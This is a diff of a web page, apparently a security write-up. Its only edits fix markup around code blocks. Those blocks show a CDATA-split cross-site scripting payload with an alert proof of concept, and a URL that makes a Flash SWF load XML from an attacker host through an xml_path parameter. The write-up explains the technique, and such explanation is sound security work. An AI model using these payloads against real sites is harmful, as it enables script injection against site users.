@@ -89,15 +89,15 @@ button 48 {
 
 <p><h2><font color="white">[ EXPLOITING VULNERABLE XML CONFIGURATIONS THROUGH CDATA ] </h2></font></p>
 <pre style="background-color: #100E15; border: none !important;">
-<code class="language-xml">
+<code>
 &lt;![CDATA[<]]>script&lt;![CDATA[>]]>alert('xss')&lt;![CDATA[<]]>/script&lt;![CDATA[>]]></code>
 </pre>
 
-This would then be called via GET in the manner of:<br>
+This would then be called via GET in the manner of:
 <pre style="background-color: #100E15; border: none !important;">
 <code class="language-htpp">
 	http://example.com/swf/example.swf?xml_path=//attacker/poc.xml
-	</pre></code>
+	</code></pre>
 
 <p>It should be noted that as a precondition, a permissive cross-domain policy needs to be configured:</p>
 <pre style="background-color: #100E15; border: none !important;"><code>
